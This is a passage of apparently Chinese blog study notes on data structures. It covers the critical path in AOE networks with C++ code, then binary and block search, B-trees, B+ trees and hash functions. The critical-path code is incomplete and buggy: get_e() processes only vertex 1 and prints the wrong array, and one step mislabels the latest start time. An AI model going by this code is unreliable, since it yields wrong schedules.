Edge）</strong>：边表示活动的网。AOE网是一个带权的有向无环图，其中顶点表示事件，弧表示活动，权表示活动持续时间。</p><ul><li>在AOE网中仅有一个入度为0的顶点，称为<strong>开始结点（源点）</strong>，表示整个工程的开始；</li><li>仅存在一个出度为0的顶点，称为<strong>结束顶点（汇点）</strong>，表示整个工程的结束；</li></ul><p><strong>路径长度</strong>：路径上各活动持续时间之和。</p><p><strong>关键路径</strong>：路径长度最长的路径。</p><p>完成整个工程的最短时间就是关键路径的长度，即关键路径上各活动花费开销的总和。因为关键活动影响整个工程的时间，因此只要找到关键活动，就找到了关键路径。</p><h2 id="6-1-相关变量"><a href="#6-1-相关变量" class="headerlink" title="6.1 相关变量"></a>6.1 相关变量</h2><h3 id="6-1-1-V-e-：事件-V-j-的最早发生时间-V-e-j"><a href="#6-1-1-V-e-：事件-V-j-的最早发生时间-V-e-j" class="headerlink" title="6.1.1 $V_{e}$：事件$V_{j}$的最早发生时间$V_{e}(j)$"></a>6.1.1 $V_{e}$：事件$V_{j}$的最早发生时间$V_{e}(j)$</h3><p>源点的最早发生时间为0，其余任一顶点$V_{j}$的最早发生时间，等于从源点出发沿着各条路径达到$V_{j}$时每条路径上权的累加和的最大值。</p><p>$$<br>    Ve(j) &#x3D; \max (Ve(i) + Weight(&lt;i ,j&gt;))<br>$$</p><h3 id="6-1-2-V-l-：事件-V-j-的最迟发生时间-V-l-j"><a href="#6-1-2-V-l-：事件-V-j-的最迟发生时间-V-l-j" class="headerlink" title="6.1.2 $V_{l}$：事件$V_{j}$的最迟发生时间$V_{l}(j)$"></a>6.1.2 $V_{l}$：事件$V_{j}$的最迟发生时间$V_{l}(j)$</h3><p>汇点的最迟发生时间$V_{l}[n]$等于汇点的最早发生时间$V_{e}[n]$。其余任一顶点$V_{i}$的最迟发生时间等于从汇点的最迟发生时间中减去从顶点$V_{i}$出发沿着各条路径达到汇点时，每条路径上权的累加和的最大值。</p><p>$$<br>    V_l(i) &#x3D; \min {V_l(j) - Weight(&lt;i ,j&gt;)}<br>$$</p><p>在计算$V_{l}(k)$时，按从后向前的顺序进行，可以在逆拓扑排序的基础上计算。</p><h3 id="6-1-3-e-i-：活动-a-i-的最早开始时间"><a href="#6-1-3-e-i-：活动-a-i-的最早开始时间" class="headerlink" title="6.1.3 $e_{i}$：活动$a_{i}$的最早开始时间"></a>6.1.3 $e_{i}$：活动$a_{i}$的最早开始时间</h3><p>即该事件的起点的最早发生时间。</p><h3 id="6-1-4-l-i-：活动-a-i-的最迟开始时间"><a href="#6-1-4-l-i-：活动-a-i-的最迟开始时间" class="headerlink" title="6.1.4 $l_{i}$：活动$a_{i}$的最迟开始时间"></a>6.1.4 $l_{i}$：活动$a_{i}$的最迟开始时间</h3><p>该活动弧的终点所表示的事件的最迟发生事件与该活动所需事件之差。</p><h3 id="6-1-5-时间余量"><a href="#6-1-5-时间余量" class="headerlink" title="6.1.5 时间余量"></a>6.1.5 时间余量</h3><p>时间余量是指一个活动的最迟开始时间和最早开始时间的差额。其中余量为0的活动为关键活动。</p><h2 id="6-2-算法思想"><a href="#6-2-算法思想" class="headerlink" title="6.2 算法思想"></a>6.2 算法思想</h2><p>求关键路径的算法步骤如下：</p><ol><li>从源点出发，令ve(源点) &#x3D; 0，按拓扑有序求其余顶点的最早发生时间ve()。</li><li>从汇点出发，令vl(汇点) &#x3D; ve(汇点)，按逆拓扑有序求其余顶点的最迟发生时间vl()。</li><li>根据各顶点的ve()值求所有弧的最早开始时间e()。</li><li>根据各顶点的vl()值求所有弧的最早开始时间l()。</li><li>求AOE网中所有活动的差额d()，找出所有d() &#x3D; 0的活动构成关键路径。</li></ol><h3 id="6-2-1-注意"><a href="#6-2-1-注意" class="headerlink" title="6.2.1 注意"></a>6.2.1 注意</h3><ul><li><strong>关键路径上的所有活动都是关键活动，可以通过加快关键活动来缩短整个工程的工期</strong>，但是不能任意缩短关键活动，因为缩短到一定程度，该关键活动就可能变成非关键活动。</li><li><strong>网中的关键路径并不唯一</strong>。对于含有多条关键路径的网中，只有加快那些包括在所有关键路径上的关键活动才能达到缩短工期的目的。</li></ul><h2 id="6-3-算法过程"><a href="#6-3-算法过程" class="headerlink" title="6.3 算法过程"></a>6.3 算法过程</h2><p><img src="https://img-blog.csdnimg.cn/20200610180344442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjA3Mjc3MQ==,size_16,color_FFFFFF,t_70"></p><h2 id="6-4-代码实现"><a href="#6-4-代码实现" class="headerlink" title="6.4 代码实现"></a>6.4 代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> h[N], inverse_h[N], e[N], ne[N], w[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> in_d[N], out_d[N];</span><br><span class="line"><span class="type">int</span> q[N], hh, tt = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> list[], <span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">e[idx] = b, ne[idx] = list[a], w[idx] = c, list[a] = idx ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ve[N];  <span class="comment">// 顶点的最早发生时间</span></span><br><span class="line"><span class="comment">// 按照拓扑排序求解所有顶点的最早发生时间</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">top_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line"><span class="keyword">if</span> (!in_d[i]) q[++ tt] = i;</span><br><span class="line"><span class="keyword">while</span> (hh &lt;= tt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> t = q[hh ++];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = e[i];</span><br><span class="line">ve[j] = <span class="built_in">max</span>(ve[j], ve[t] + w[i]);</span><br><span class="line"><span class="keyword">if</span> (-- in_d[j] == <span class="number">0</span>) q[++ tt] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ver:%d ve:%d\n&quot;</span>, i, ve[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> vl[N];  <span class="comment">// 求顶点的最迟发生时间</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inverse_top</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(vl, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> vl);</span><br><span class="line">hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line"><span class="keyword">if</span> (!out_d[i]) q[++ tt] = i;</span><br><span class="line">vl[q[hh]] = ve[q[hh]];</span><br><span class="line"><span class="keyword">while</span> (hh &lt;= tt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> t = q[hh ++];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = inverse_h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = e[i];</span><br><span class="line">vl[j] = <span class="built_in">min</span>(vl[j], vl[t] - w[i]);</span><br><span class="line"><span class="keyword">if</span> (-- out_d[j] == <span class="number">0</span>) q[++ tt] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ver:%d vl:%d\n&quot;</span>, i, vl[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ee[N];  <span class="comment">// 得到每个边的最早开始时间</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_e</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line">q[++ tt] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (hh &lt;= tt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> t = q[hh ++];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">ee[i] = ve[t];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ver:%d vl:%d\n&quot;</span>, i, vl[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line"><span class="built_in">memset</span>(inverse_h, <span class="number">-1</span>, <span class="keyword">sizeof</span> inverse_h);</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">while</span> (m --)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b, c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line"><span class="built_in">add</span>(h, a, b, c); <span class="built_in">add</span>(inverse_h, b, a, c);</span><br><span class="line">out_d[a] ++, in_d[b] ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">top_sort</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;--------&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">inverse_top</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;--------&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">get_e</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构第7章：查找</title>
      <link href="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/"/>
      <url>/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="1-总览"><a href="#1-总览" class="headerlink" title="1 总览"></a>1 总览</h1><p><strong>查找表</strong>：查找表是由同一类型的数据元素（或记录）构成的集合。由于“集合”中的数据元素之间存在着完全松散的关系，因此查找表是一种非常灵便的数据结构，可以用其他的数据结构来实现。</p><p><strong>动态查找表</strong>：若在查找的同时对表做修改操作（插入删除等）则相应的表称之为动态查找表；否则称之为静态查找表。</p><p><strong>平均查找长度ASL</strong>（查找算法的评价指标）：为确定记录在查找表中的位置，需和给定值进行比较的关键字个数的期望值，称为查找算法在查找成功时的平均查找长度（Average Search Length）。</p><p><strong>对查找表常进行的3种操作：</strong></p><ol><li>查询某个特定的值是否在表中</li><li>插入一个元素</li><li>删除一个元素</li></ol><hr><h1 id="2-顺序查找和折半查找"><a href="#2-顺序查找和折半查找" class="headerlink" title="2 顺序查找和折半查找"></a>2 顺序查找和折半查找</h1><h2 id="2-1-顺序查找"><a href="#2-1-顺序查找" class="headerlink" title="2.1 顺序查找"></a>2.1 顺序查找</h2><p><strong>算法思想</strong>：通过数组下标递增来顺序操作每个元素，返回结果。</p><p><strong>优点</strong>：对数据存储结构没有任何要求。</p><p><strong>缺点</strong>：平均查找长度$ASL&#x3D;n$，效率较低。</p><h2 id="2-2-折半查找"><a href="#2-2-折半查找" class="headerlink" title="2.2 折半查找"></a>2.2 折半查找</h2><p>折半查找是一种效率高效的查找方法，但是仅适用于有序的顺序表。</p><p>折半查找算法思路：（非递归）</p><ol><li>设表长为n、low、high和mid分别指向待查元素所在区间的上界、下界和中点，key为给定的要查找的值。</li><li>初始时，令low&#x3D;1，high&#x3D;n，mid&#x3D;[(low+high)&#x2F;2]。</li><li>让k与mid指向的记录比较；若key&#x3D;&#x3D;R[mid].key，查找成功；若key&lt;R[mid].key，则high&#x3D;mid-1;若key&gt;R[mid].key，则low&#x3D;mid+1；若low&gt;high,则返回0代表元素不存在。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> mid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// todo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将区间[l, r]划分成[l, mid]和[mid + 1, r]，mid不需要加1</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">binary_search_1</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将区间[l, r]划分成[l, mid - 1]和[mid, r]，mid需要加1</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">binary_search_2</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r + <span class="number">1</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) l = mid;</span><br><span class="line">        <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>折半查找的过程可以用判定树来表示，把顺序表中的每个元素查找到所用的查找次数写出来，然后次数为1的作为树的根结点，然后查找次数为2的放到第二层，依次把每个元素放到树中。</p><p>查找成功时的查找长度为从根结点到目的结点的路径上的结点数，而查找失败为从根结点到对应失败结点的父结点的路径上的结点数。每个结点的值均大于其左子结点，均小于其右子结点。<br><img src="https://img-blog.csdnimg.cn/20200427202441822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjczMzQ0Mg==,size_16,color_FFFFFF,t_70"></p><p>折半查找的时间复杂度为$O(logn)$，要求线性表必须具有随机存取的特性，仅适用于顺序存储结构，不适于链式存储结构。</p><h2 id="2-3-分块查找"><a href="#2-3-分块查找" class="headerlink" title="2.3 分块查找"></a>2.3 分块查找</h2><p>分块查找是一种性能介于顺序查找和折半查找之间的一种查找方法。</p><p><strong>算法思想</strong></p><ol><li>将表分成几块，且表或者有序，或者分块有序；即若$i &lt; j$，则第j块中所有记录的关键字均大于第$i$块中的最大关键字。（注意在块内元素可以是无序的）。</li><li>建立索引表（每个结点含有最大关键字域和指向本块第一个结点的指针，且按关键字有序）。</li></ol><p><strong>查找过程</strong>：首先确定待查记录所在块（顺序或折半查找），再在块内查找（顺序查找）。<br><img src="https://img-blog.csdnimg.cn/47f709bfc2084ffe8f944480a906915a.png"></p><h2 id="2-4-上述三种查找对比"><a href="#2-4-上述三种查找对比" class="headerlink" title="2.4 上述三种查找对比"></a>2.4 上述三种查找对比</h2><p><img src="https://img-blog.csdnimg.cn/72c32d9944ef463889185f44c3d49e5e.png"></p><hr><h1 id="3-B-树"><a href="#3-B-树" class="headerlink" title="3 B 树"></a>3 B 树</h1><p>B树，又称<strong>多路平衡查找树</strong>，B树中所有结点的孩子个数的最大值成为B树的<strong>阶</strong>，通常用$m$表示。</p><p>在大多数的平衡查找树（Self-balancing search trees），比如 AVL 树和红黑树，都假设所有的数据放在主存当中。那为什么要使用 B-树呢（或者说为啥要有 B-树呢）？要解释清楚这一点，我们假设我们的数据量达到了亿级别，主存当中根本存储不下，我们只能以块的形式从磁盘读取数据，与主存的访问时间相比，磁盘的 I&#x2F;O 操作相当耗时，而提出 B-树的主要目的就是<strong>减少磁盘的 I&#x2F;O 操作</strong>。</p><p>大多数平衡树的操作（查找、插入、删除，最大值、最小值等等）需要$O(h)$次磁盘访问操作，其中 $h$ 是树的高度。但是对于 B-树而言，树的高度将不再是 $O(logn)$ （其中 $n$ 是树中的结点个数），而是一个我们可控的高度 $h$（通过调整 B-树中结点所包含的键【你也可以叫做数据库中的索引，本质上就是在磁盘上的一个位置信息】的数目，使得 B-树的高度保持一个较小的值）。</p><p>一般而言，B-树的结点所包含的键的数目和磁盘块大小一样，从数个到数千个不等。由于B-树的高度 $h$ 可控（一般远小于 $logn$），所以与 AVL 树和红黑树相比，B-树的磁盘访问时间将极大地降低。</p><h2 id="3-1-B-树的特性"><a href="#3-1-B-树的特性" class="headerlink" title="3.1 B 树的特性"></a>3.1 B 树的特性</h2><ol><li>所有的叶子结点都出现在同一层上，并且不带信息(可以看做是外部结点或查找失败的结点，实际上这些结点不存在，指向这些结点的指针为空)。</li><li>每个结点包含的关键字个数有上界和下界。用一个被称为 B-树的<strong>最小度数</strong>的固定整数 t ≥ 2 来表示这些界，其中 t 取决于磁盘块的大小：<ul><li>除根结点以外的每个结点必须至少有 t - 1 个关键字。因此，除了根结点以外的每个内部结点有 t 个孩子。如果树非空，根结点至少有一个关键字。</li><li>每个结点至多包含 2t - 1 个关键字。</li></ul></li><li>一个包含 x 个关键字的结点有 x + 1 个孩子；</li><li>一个结点中的所有关键字升序排列，两个关键字 $ k_{1} $ 和 $ k_{2} $ 之间的孩子结点的所有关键字 key 在 ($ k_{1} $, $ k_{2} $) 的范围之内。</li><li>与二叉排序树不同， B-树的搜索是从根结点开始，根据结点的孩子树做多路分支选择，而二叉排序树做的是二路分支选择，每一次判断都会进行一次磁盘 I&#x2F;O 操作。</li><li>与其他平衡二叉树类似，B-树查找、插入和删除操作的时间复杂度为 $O(logn)$ 量级。<br><img src="https://cdn.acwing.com/media/article/image/2022/02/16/150576_ad9a775d8e-1.png"></li></ol><h2 id="3-2-B-树的查找"><a href="#3-2-B-树的查找" class="headerlink" title="3.2 B 树的查找"></a>3.2 B 树的查找</h2><p>B树的查找包含两个基本操作：</p><ol><li>在B树中找结点</li><li>在结点内找关键字</li></ol><p>B树常存储在磁盘上，第一个操作是在磁盘上进行的，后一个查找操作是在内存中进行的。在结点内通常采用顺序查找或折半查找。</p><ol><li>将给定值与根结点关键字相比较，如果相等，那么查找成功。</li><li>如果小于$K_i$，那么下次从以 $A_i-1$ 为根的子树中查找。否则下次从以 $A_i+1$ 为根的子树中查找。</li><li>如果查找到叶子结点，那么查找失败。</li></ol><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/image.png"></p><p>例如，在4阶B-树中查找给定值26，首先与根结点上的关键字35比较。因为26&lt;35，所以，由A0找到结点B。因为26&gt;18，再与结点E上的关键字比较，26&lt;27，而该结点的A0子树为失误结点叶子。所以，确定该树中不存在26，查找失败。</p><h2 id="3-3-B-树的插入"><a href="#3-3-B-树的插入" class="headerlink" title="3.3 B 树的插入"></a>3.3 B 树的插入</h2><p>在B树中找到插入的位置后，并不能简单地将其添加到终端结点，因为此时可能会导致整棵树不符合B树定义中的要求，插入过程如下：</p><ol><li>从根结点开始按照查找的过程确定给定值应插入的结点位置P。</li><li>如果该结点上的关键字个数少于 m - 1 个，则将给定值直接插到该结点上。</li><li>如果应插入的结点上，已有 m - 1 个关键字，那么，必须把该结点分裂成两个结点；（P、P’） 。</li></ol><p><strong>分裂的方法是：</strong></p><ul><li><p>取一个新的结点，在插入key后的原结点，从中间位置 m  &#x2F; 2（向上取整）将其中的关键字分为两部分，左部分包含的关键字放在原结点，右部分的关键字放在新结点中，中间位置 m &#x2F; 2（向上取整）的结点插入原结点的父节点。</p></li><li><p>如果此时导致父结点的关键字个数也超过了上限，继续进行这种分裂，直到传递到根节点位置。</p></li></ul><p><strong>举例如下：</strong><br><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/B%E6%A0%91.png"></p><h2 id="3-4-B-树的删除"><a href="#3-4-B-树的删除" class="headerlink" title="3.4 B 树的删除"></a>3.4 B 树的删除</h2><p>B树的删除操作与插入类似，但是复杂一些，因为可能涉及结点的合并。</p><hr><h1 id="4-B-树"><a href="#4-B-树" class="headerlink" title="4 B+树"></a>4 B+树</h1><p>B+树是应数据库所需出现的一种B树的变形树。</p><p>一棵m阶的B+树和m阶的B-树的差异在于:</p><ol><li>有n棵子树的结点中含有n个关键字。</li><li>所有的叶子结点中包含了全部关键字的信息，以及指向含这些关键字记录的指针，且叶子结点本身依关键字的大小自小而大顺序链接。</li><li>所有的非终端结点可以看成是索引部分，结点中仅含有其子树（根结点）中的最大（或最小）关键字。</li></ol><p><img src="https://ts1.cn.mm.bing.net/th/id/R-C.fd4e3f2d62108717948e2da04c4711a5?rik=c96a3k0WlXaoUA&riu=http://picture-pool.oss-cn-beijing.aliyuncs.com/2019-05-30-044400.png&ehk=qNgFmNlml668IfAuXQdOLMYoBVxKVSwdeiVBzufDg6U=&risl=&pid=ImgRaw&r=0"></p><p>可以看出，分支结点的某个关键字是其子树中最大关键字的副本。通常在B+树中有两个头指针：一个指向根节点，另一个指向关键字最小的叶结点。</p><p>因此，可以对B+树进行两种查找运算：</p><ol><li>从最小关键字开始的顺序查找</li><li>从根节点开始的多路查找</li></ol><p>为什么数据库不适用哈希索引？</p><ul><li>因为数据库查找中通常有很多范围查找，但是哈希值是无序的，所以不能使用。</li></ul><hr><h1 id="5-散列表"><a href="#5-散列表" class="headerlink" title="5 散列表"></a>5 散列表</h1><p>前面讨论的线性表、树表结构的查找方法，这类查找方法都是以关键字的比较为基础的。而散列表的思想是通过对元素的关键字值进行某种运算，直接求出元素的地址，即使用关键字到地址的直接转换方法，而不需要反复比较。</p><p><strong>散列函数和散列地址</strong>：在记录的存储位置$p$和其关键字$key$之间建立一个确定的对应的关系$H$，使$p&#x3D;H(key)$，称这个对应关系$H$为散列函数，$p$为散列地址。</p><p><strong>散列方法（杂凑法）</strong>：选取某个函数，依该函数按关键字计算元素的存储位置，并按此存放；查找时，由同一个函数对给定值$k$计算地址，将$k$与地址单元中元素关键码进行比对，确定查找是否成功。</p><p><strong>散列表</strong>：一个有限连续的地址空间，用以存储按散列函数计算得到相应散列地址的数据记录。通常散列表的存储空间是一个一维数组，散列地址是数组的下标。</p><p><strong>冲突和同义词</strong>：对不同的关键字可能得到同一散列地址，即$key_1 \neq key_2$，而$H(key_1) &#x3D; H(key_2)$，这种现象称为冲突。具有相同函数值的关键对该散列函数来说称作同义词，$key_1$与$key_2$互称为同义词（冲突是不可避免的，我们只能尽可能减少）。</p><h2 id="5-1-散列函数的构造方法"><a href="#5-1-散列函数的构造方法" class="headerlink" title="5.1 散列函数的构造方法"></a>5.1 散列函数的构造方法</h2><p>在构造散列函数时，必须注意以下几点：</p><ol><li>构造好的散列函数，所选函数尽可能简单，以便提高转换速度。</li><li>所选函数对关键码计算出的地址，应在散列地址集中致均匀分布，以减少空间浪费。</li><li>制定一个好的解决冲突的方案，查找时如果从散列函数计算出的地址查不到关键码，则应当依据解决冲突的规则，有规律的查询其它相关单元。</li></ol><h3 id="5-1-1-直接定址法"><a href="#5-1-1-直接定址法" class="headerlink" title="5.1.1 直接定址法"></a>5.1.1 直接定址法</h3><p>直接取关键字的某个线性函数值为散列地址，散列函数为$H(key) &#x3D; a × key + b$。</p><p><img src="https://img-blog.csdnimg.cn/20200504114709427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3MTQ5MDYy,size_16,color_FFFFFF,t_70"></p><p>这类函数计算简单，分布均匀，不会产生冲突，但要求地址集合与关键词集合大小相同，因此，对于较大的关键词集合不适用。所以在现实应用中并不常用。</p><h3 id="5-1-2-除留余数法"><a href="#5-1-2-除留余数法" class="headerlink" title="5.1.2 除留余数法"></a>5.1.2 除留余数法</h3><p>现实应用中比较常用的方法是除留取余法。假设散列表长为TableSize（TableSize的选取，通常由关键词集合的大小n和允许最大装填因子α决定，一般将TableSize取为 n &#x2F; α ）,选择一个正整数p&lt;&#x3D;TableSize，散列函数为：</p><p>$$<br>h(key) &#x3D; key \% p<br>$$</p><p>即取关键词除以p的余数作为散列地址。使用除留取余法，选取合适的p很重要，一般选取p为小于或等于散列表长TableSize的某个最大素数比较好。</p><p>用素数求得的余数作为散列地址，比较均匀分布在整个地址空间上的可能性较大。</p><p><img src="https://img-blog.csdnimg.cn/20200504114953419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3MTQ5MDYy,size_16,color_FFFFFF,t_70"></p><h3 id="5-1-3-数字分析法"><a 